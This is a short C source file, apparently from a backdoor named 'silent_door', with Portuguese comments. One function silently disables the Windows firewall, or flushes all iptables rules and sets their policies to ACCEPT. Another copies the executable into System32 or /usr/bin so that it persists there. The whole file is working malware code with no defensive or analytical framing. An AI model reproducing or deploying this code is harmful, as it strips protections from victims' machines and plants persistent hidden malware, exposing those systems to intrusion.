#include "execfuncs.h"
#include "main.h"
#include <unistd.h> // Para execve, __progname
#include <stdlib.h> // Para free

int kill_frwl()

{

#if defined(_WIN32) || defined(_WIN64)
    // Comando para desativar o firewall do Windows
    system("netsh advfirewall set allprofiles state off > NUL 2>&1");
#else
    // Comandos para limpar as regras do iptables no Linux
    system("iptables -F > /dev/null 2>&1");
    system("iptables -X > /dev/null 2>&1");
    system("iptables -t nat -F > /dev/null 2>&1");
    system("iptables -t nat -X > /dev/null 2>&1");
    system("iptables -t mangle -F > /dev/null 2>&1");
    system("iptables -t mangle -X > /dev/null 2>&1");
    system("iptables -P INPUT ACCEPT > /dev/null 2>&1");
    system("iptables -P FORWARD ACCEPT > /dev/null 2>&1");
    system("iptables -P OUTPUT ACCEPT > /dev/null 2>&1");
#endif

return 0;

}

int auto_copy()
{
    // Esta função é mais complexa de tornar portável com execve.
    // Usar system() é mais simples para este exemplo.
    // O ideal seria obter o nome do executável via argv[0] no main.
#if defined(_WIN32) || defined(_WIN64)
    // Copia para um local comum no Windows.
    // NOTA: Requer permissões de administrador.
    system("copy .\\silent_door.exe C:\\Windows\\System32\\ > NUL 2>&1");
#else
    // __progname é uma extensão GNU, não é totalmente portável.
    // Usar fork+execve seria melhor para não substituir o processo.
    pid_t pid = fork();
    if (pid == 0) { // Processo filho
        char *args[] = {"/bin/cp", __progname, "/usr/bin/", NULL};
        execve(args[0], args, NULL);
        exit(1); // Sai se o execve falhar
    }
    // O processo pai continua
#endif
    return 0;
}
